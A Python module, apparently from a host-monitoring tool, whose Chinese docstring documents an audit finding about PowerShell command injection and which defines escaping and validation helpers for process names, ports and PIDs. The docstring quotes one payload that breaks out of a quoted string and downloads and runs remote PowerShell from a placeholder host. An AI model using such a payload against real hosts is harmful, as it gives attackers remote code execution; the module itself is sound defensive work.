"""拼接远程命令时的转义与参数校验（安全审计 P0：远程命令注入）。

背景：主机上「映像名称 / 进程名」是用户在页面上自由填写的字段，早期代码直接
用 f-string 把它拼进 PowerShell 的 `@{ id=..; image='..' }` 里，只做了
`.replace(".exe","")`，**没有转义单引号**。于是填一个

    a'}; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/y')

就能闭合引号，在**被监控主机上以管理员身份**执行任意 PowerShell——这是本项目
里危害最大的一个漏洞（比 Agent 零鉴权更直接：拿到的是域内机器的 SYSTEM 权限）。

原则：
  1. 所有进入远程命令的用户可控字符串**必须**先经过本模块的转义；
  2. 能校验成"确定安全形状"的（端口、PID）一律强制转型，绝不靠转义兜底；
  3. 校验失败的字段直接丢弃该条监控项，而不是"尽力转义后照用"。

 注意：`agent._run_winrm()` 走的是 `powershell -EncodedCommand`，所以**不存在**
cmd 层的 `&`/`|` 注入，但 PowerShell 自己的字符串/表达式注入依然存在，必须转义。
"""

from __future__ import annotations

import re
import shlex

# 映像名允许的字符：字母、数字、下划线、连字符、点、空格、括号、@、+、#
_SAFE_IMAGE_RE = re.compile(r"^[A-Za-z0-9_.+\-@#()\[\] ]{1,120}$")


def ps_quote(value: str) -> str:
    """把字符串安全地放进 PowerShell 单引号字符串里。

    PowerShell 单引号字符串里唯一需要转义的就是单引号本身（写成两个）。
    ``$``、反引号、双引号在单引号串内都不展开，无需处理。
    """
    return "'" + str(value).replace("'", "''") + "'"


def sh_quote(value: str) -> str:
    """把字符串安全地放进 POSIX shell 命令里（SSH 走的是 exec_command -> sh -c）。"""
    return shlex.quote(str(value))


def safe_image(value: str) -> str:
    """校验并归一化"映像/进程名"，不合格返回空串（调用方应跳过这一项）。

    去掉 `.exe` 后缀是历史行为（Get-Process 的 Name 不带后缀），保留。
    """
    v = (value or "").strip()
    if not v:
        return ""
    # 控制字符（换行/回车/制表符）可能截断命令，直接拒绝而不是"删掉继续用"，
    # 悄悄改写用户输入会掩盖攻击行为，宁可让这一条监控项不生效。
    if any(ch < " " or ch == "\x7f" for ch in v):
        return ""
    v = re.sub(r"\.exe$", "", v, flags=re.IGNORECASE)
    if not v or not _SAFE_IMAGE_RE.match(v):
        return ""
    return v


def safe_int(value, min_value: int | None = None, max_value: int | None = None) -> int | None:
    """强制转型成 int，越界或非法返回 None。用于端口 / PID 这类必须确定的值。"""
    try:
        n = int(str(value).strip())
    except (TypeError, ValueError):
        return None
    if min_value is not None and n < min_value:
        return None
    if max_value is not None and n > max_value:
        return None
    return n
